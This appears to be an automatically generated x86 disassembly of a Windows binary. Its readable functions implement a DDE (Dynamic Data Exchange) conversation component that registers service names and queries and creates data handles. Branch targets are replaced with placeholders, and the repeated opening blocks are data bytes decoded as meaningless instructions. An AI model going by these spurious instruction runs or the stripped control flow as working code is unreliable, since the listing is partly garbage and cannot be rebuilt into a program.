or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xc08b6d65
int3
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
jb r-xdata
insd
adc al 0x3d
dec eax
add [ ecx + esi * 2 + 0x41 ] dl
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
fdivr [ 0x48 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ esi ] bh
dec eax
add [ esi + edi ] ch
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add al dh
push esp
dec eax
add [ eax - 0x67ffbe70 ] dl
nop
inc ecx
add [ edi + ecx * 4 + 0xe0041 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add al 0x0
outsd
outsb
jbe r-xdata
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
adc [ eax ] al
xor [ eax ] al
cmp eax 0x71540048
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
pushfd
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x33ffb7c2 ] ch
dec eax
add [ eax ] al
add [ eax ] al
sub_483c74
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc00483c
add [ eax ] al
add [ eax + 0x72 ] ch
inc eax
add al ah
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
aam 0x61
dec eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
outsd
jb r-xdata
mov [ eax + ecx * 2 ] ds
nop
nop
jb r-xdata
dec eax
add [ edi ] al
pop es
push esp
inc esp
dec ebp
jb r-xdata
rcl [ edi + 0x48 ] 0x0
add [ eax ] al
add [ eax ] al
add [ ebp + edi + 0x48 ] al
add [ eax + 0x3d ] ch
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x3d ] dl
dec eax
add [ eax ] al
add [ eax ] al
pop eax
jo r-xdata
add [ eax + edx + 0x300040 ] dl
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
dec eax
pop esp
dec eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bl
dec eax
add [ eax ] cl
add [ eax ] al
pop eax
jo r-xdata
je r-xdata
jno r-xdata
xor al 0x40
add ah ch
xor al 0x40
add al dh
cmp al 0x48
add [ ecx + esi * 2 + 0x41 ] dl
loopne r-xdata
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edx ] cl
dec eax
add [ eax - 0x17ffbe70 ] dl
push ss
inc edx
add [ edi + ecx * 4 + 0x17c00041 ] ch
inc edx
add [ esi + edx + 0x17d00042 ] cl
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
jb r-xdata
loopne r-xdata
inc ecx
add al ch
push ss
inc edx
add [ edi + ecx * 4 + 0x17c00041 ] ch
inc edx
add al ah
sbb al [ edx ]
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ esp + ebx * 2 - 0x6f6fffb8 ] cl
insd
nop
push 0x700483d
or al 0x54
inc esp
push ebx
jb r-xdata
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x9004032 ] ah
inc ebp
inc esp
inc ebp
jb r-xdata
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
mov esp 0x483c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi + 0xc0048 ] bh
add [ eax ] al
push 0xe0004072
add [ eax + edx + 0x340040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x1400483e ] bh
add [ eax ] al
add ah cl
popad
outsd
outsb
jbe r-xdata
add [ esi + edx + 0x17d00042 ] cl
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
jb r-xdata
loopne r-xdata
sub al 0x3e
dec eax
add [ edi ] al
or al 0x54
inc esp
push ebx
jb r-xdata
in al dx
je r-xdata
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
inc edx
add ah ch
add [ eax ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xc08b6d65
int3
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
jb r-xdata
insd
adc al 0x3d
dec eax
add [ ecx + esi * 2 + 0x41 ] dl
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
fdivr [ 0x48 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ esi ] bh
dec eax
add [ esi + edi ] ch
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add al dh
push esp
dec eax
add [ eax - 0x67ffbe70 ] dl
nop
inc ecx
add [ edi + ecx * 4 + 0xe0041 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add al 0x0
outsd
outsb
jbe r-xdata
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
adc [ eax ] al
xor [ eax ] al
cmp eax 0x71540048
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
pushfd
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x33ffb7c2 ] ch
dec eax
add [ eax ] al
add [ eax ] al
sub_483f0c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor edx edx
push ebp
push sub_483ffe
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484005
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4040d0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov ebx eax
mov eax ebx
add eax 0xffffbff9
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e08
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408fe4
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405e08
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408fe4
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405e08
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408fe4
sub_48400c
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
xor edi edi
mov eax esi
sub eax 0x1062
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_4843b4
mov edi eax
and edi 0x7f
jmp r-xdata
sub eax 0x1080
je r-xdata
test ebx ebx
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_484468
mov edi eax
jmp r-xdata
sub eax 0x5f90
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov [ ebp - 0x64 ] 0x60
cmp esi 0x8080
jne r-xdata
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax [ rw-data ]
call sub_4844cc
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp esi 0x4050
jg r-xdata
lea eax [ ebp - 0x64 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push ebx
call DdeQueryConvInfo
test eax eax
je r-xdata
sub esi 0x4090
je r-xdata
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_485e74
mov edi eax
jmp r-xdata
sub esi 0x3fb0
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_485f28
mov edi eax
jmp r-xdata
sub esi 0x1030
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_485e44
jmp r-xdata
sub esi 0x40
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_485d10
mov edi eax
and edi 0x7f
jmp r-xdata
sub esi 0xff2
je r-xdata
mov eax [ ebp - 0x60 ]
test eax eax
je r-xdata
sub esi 0x42
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_485f48
mov edi eax
jmp r-xdata
sub esi 0x8e
je r-xdata
call sub_4850b4
jmp r-xdata
mov ebx [ ebp - 0x60 ]
test ebx ebx
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_485f48
mov edi eax
jmp r-xdata
sub esi 0x1f60
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x1c ]
call sub_485100
jmp r-xdata
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4845b0
mov eax ebx
call sub_4850bc
jmp r-xdata
sub_48421c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4842d0
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_421370
push r-xdata
call RegisterClipboardFormatA
mov [ esi + 0x48 ] ax
xor eax eax
mov [ esi + 0x44 ] eax
push 0x0
push 0x0
push sub_48400c
lea eax [ esi + 0x44 ]
push eax
call DdeInitializeA
test eax eax
sete al
call sub_483f0c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ esi + 0x38 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ esi + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ esi + 0x40 ] eax
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_402a14
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4845f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4842d7
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
add esp 0xfffffff0
call sub_4035fc
sub_4842f9
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
call sub_403664
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x3c ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x38 ]
call sub_4032b0
xor eax eax
mov [ ebp + 0x38 ] eax
inc esi
xor edi edi
mov eax ebp
call sub_4846ac
mov eax [ ebp + 0x44 ]
push eax
call DdeUninitialize
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_4213bc
test bl bl
jle r-xdata
call sub_4032b0
xor eax eax
mov [ ebp + 0x40 ] eax
mov eax [ ebp + 0x3c ]
call sub_4032b0
xor eax eax
mov [ ebp + 0x3c ] eax
inc esi
xor edi edi
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_4189b0
call sub_4032b0
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40364c
mov eax [ ebp + 0x3c ]
mov edx edi
call sub_4189b0
call sub_4032b0
inc edi
dec esi
jne r-xdata
sub_4843b4
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_484458
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ edi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_40419c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4846d8
test eax eax
je r-xdata
mov eax [ edi + 0x34 ]
push eax
push esi
call DdeCmpStringHandles
test eax eax
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_484728
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48445f
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
mov bl 0x1
sub_484468
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov esi ecx
mov ebp edx
mov ebx eax
xor edi edi
test esi esi
je r-xdata
mov eax edi
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esi
mov edx ebp
mov eax ebx
call sub_4843b4
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x34 ]
mov [ esp ] eax
mov [ esp + 0x4 ] esi
xor eax eax
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0xc ] eax
push 0x0
push 0x1
push 0x0
push 0x0
push 0x10
lea eax [ esp + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_4844cc
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_48459d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_485c48
mov ebx eax
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_40419c
lea eax [ ebx + 0x30 ]
mov edx [ ebp - 0x8 ]
call sub_404100
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4846d8
mov [ ebx + 0x3c ] eax
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
mov [ ebx + 0x40 ] edi
push ebx
push 0xffffffff
push edi
call DdeSetUserHandle
mov edx ebx
mov eax [ esi + 0x38 ]
call sub_418854
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_484728
mov [ ebx + 0x38 ] eax
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4845a4
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
mov si 0xffef
call sub_4034ac
sub_4845b0
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x40 ]
test eax eax
je r-xdata
mov si 0xffee
call sub_4034ac
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
push 0x0
push 0xffffffff
push eax
call DdeSetUserHandle
pop edi
pop esi
pop ebx
retn
mov edx ebx
call sub_418b4c
mov eax ebx
call sub_4032b0
sub_4845f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_484694
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4846ac
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_408820
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x30 ]
call sub_404100
mov edx [ ebx + 0x30 ]
mov eax r-xdata
call sub_4046b0
mov esi eax
test esi esi
je r-xdata
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_40456c
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeCreateStringHandleA
mov esi eax
mov [ ebx + 0x34 ] esi
push 0x1
push 0x0
push esi
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48469b
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax [ ebx + 0x30 ]
call sub_40436c
mov ecx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_40460c
sub_4846ac
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x34 ] eax
pop ebx
retn
push 0x2
push 0x0
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeFreeStringHandle
sub_4846d8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x40 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x40 ]
mov edx edi
call sub_4189b0
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4080b0
test eax eax
jne r-xdata
sub_484728
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_4847aa
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46cffc
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4847b1
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_46cfe8
mov ebx eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_44f854
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4080b0
test eax eax
jne r-xdata
sub_4847bc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x38 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_4189b0
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x30 ]
call sub_4080b0
test eax eax
jne r-xdata
sub_48480c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40455c
xor eax eax
push ebp
push sub_484863
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_4847bc
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48486a
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov edx [ ebp - 0x4 ]
call sub_486130
test eax eax
je r-xdata
call sub_486314
sub_484890
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421370
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ esi + 0x9c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4848d8
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax esi
call sub_484f1c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4213bc
mov eax [ esi + 0x9c ]
call sub_4032b0
xor eax eax
mov [ esi + 0x9c ] eax
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_484918
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4216e8
push ebx
push sub_4849e8
push ebx
push r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov cl 0x1
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_484965
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4849dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4217c0
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x30 ]
call sub_404144
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x34 ]
call sub_404144
mov eax [ ebp - 0x4 ]
call sub_40436c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4849e3
cmp [ ebx + 0xc5 ] 0x1
je r-xdata
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_484cd8
sub_4849e8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor eax eax
push ebp
push j_sub_403a2c#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_41d0bc
jmp r-xdata
mov eax esi
call sub_41c158
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41dd5c
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_4046b0
mov ebx eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40436c
mov ecx eax
sub ecx ebx
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_4045cc
mov eax [ ebp - 0x4 ]
mov al [ eax ]
sub al 0x53
je r-xdata
mov eax esi
call sub_41d0c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484a9a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4851c0
jmp r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4851d4
jmp r-xdata
sub_484aa7
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_484b63
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41f2f0
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x30 ]
call sub_404144
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_408fe4
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_420a64
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x34 ]
call sub_404144
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_408fe4
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_420a64
mov eax ebx
call sub_41f2f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484b6a
lea eax [ ebp - 0x14 ]
call sub_4040ac
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
sub_484b98
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4854ac
mov esi eax
mov eax [ ebx + 0x9c ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_418a2c
mov [ esi + 0x10 ] edi
xor edx edx
mov eax esi
call sub_48551c
pop edi
pop esi
pop ebx
retn
sub_484bd0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_484c90
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_48551c
mov edx ebx
mov eax [ esi + 0x9c ]
call sub_418b4c
mov eax ebx
call sub_4032b0
sub_484c08
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
mov edx edi
mov eax esi
call sub_484c90
mov ebx eax
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_40436c
test eax eax
jle r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_40436c
test eax eax
jne r-xdata
mov edx edi
mov eax esi
call sub_484b98
mov edx edi
mov eax esi
call sub_484c90
mov ebx eax
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax ebx
call sub_48551c
mov [ esp ] al
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_484bd0
jmp r-xdata
test [ esi + 0x1c ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_484bd0
sub_484c90
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
xor eax eax
mov [ esp + 0x4 ] eax
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_4189b0
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov [ esp + 0x4 ] eax
jmp r-xdata
sub_484cd8
push ebp
